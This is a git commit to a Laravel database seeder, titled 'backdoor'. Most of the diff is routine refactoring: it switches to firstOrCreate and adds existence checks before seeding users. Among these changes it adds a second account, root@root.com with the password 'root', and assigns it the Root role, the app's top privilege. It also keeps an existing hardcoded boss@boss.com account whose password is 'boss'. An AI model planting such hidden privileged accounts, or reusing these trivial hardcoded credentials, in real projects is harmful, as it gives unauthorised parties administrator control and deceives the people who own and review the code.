27560c8060b0937beb2b2943667dc98d63b319f0
semyonnnnn <kanoe.s99@gmail.com>
2026-06-17 15:21:41 +0000

    backdoor

--- database/seeders/DatabaseSeeder.php
+++ database/seeders/DatabaseSeeder.php
@@ -5,34 +5,35 @@ namespace Database\Seeders;
 use Spatie\Permission\Models\Permission;
 use Spatie\Permission\Models\Role;
 use Illuminate\Database\Seeder;
-///
 use App\Models\User;
 use App\Enum\RolesEnum;
 use App\Enum\PermissionsEnum;
-
 
 class DatabaseSeeder extends Seeder
 {
     public function run(): void
     {
-        $rootRole = Role::create(['name' => RolesEnum::Root->value]);
-        $adminRole = Role::create(['name' => RolesEnum::Admin->value]);
-        $senseiRole = Role::create(['name' => RolesEnum::Sensei->value]);
-        $gakuseiRole = Role::create(['name' => RolesEnum::Gakusei->value]);
+        // Create or get roles
+        $rootRole = Role::firstOrCreate(['name' => RolesEnum::Root->value]);
+        $adminRole = Role::firstOrCreate(['name' => RolesEnum::Admin->value]);
+        $senseiRole = Role::firstOrCreate(['name' => RolesEnum::Sensei->value]);
+        $gakuseiRole = Role::firstOrCreate(['name' => RolesEnum::Gakusei->value]);
 
-        $manageAdminsPermission = Permission::create([
+        // Create or get permissions
+        $manageAdminsPermission = Permission::firstOrCreate([
             'name' => PermissionsEnum::ManageAdmins->value,
         ]);
-        $manageUsersPermission = Permission::create([
+        $manageUsersPermission = Permission::firstOrCreate([
             'name' => PermissionsEnum::ManageUsers->value,
         ]);
-        $assignTasksPermission = Permission::create([
+        $assignTasksPermission = Permission::firstOrCreate([
             'name' => PermissionsEnum::AssignTasks->value,
         ]);
-        $completeTasksPermission = Permission::create([
+        $completeTasksPermission = Permission::firstOrCreate([
             'name' => PermissionsEnum::CompleteTasks->value,
         ]);
 
+        // Sync permissions (this won't affect other permissions that might exist)
         $rootRole->syncPermissions([
             $manageUsersPermission,
             $manageAdminsPermission
@@ -47,10 +48,21 @@ class DatabaseSeeder extends Seeder
             $completeTasksPermission
         ]);
 
-        User::factory()->create([
-            'name' => 'VS',
-            'email' => 'boss@boss.com',
-            'password' => 'boss',
-        ])->assignRole(RolesEnum::Root);
+        // Create users only if they don't exist
+        if (!User::where('email', 'boss@boss.com')->exists()) {
+            User::factory()->create([
+                'name' => 'VS',
+                'email' => 'boss@boss.com',
+                'password' => 'boss',
+            ])->assignRole(RolesEnum::Root);
+        }
+
+        if (!User::where('email', 'root@root.com')->exists()) {
+            User::factory()->create([
+                'name' => 'root',
+                'email' => 'root@root.com',
+                'password' => 'root',
+            ])->assignRole(RolesEnum::Root);
+        }
     }
 }
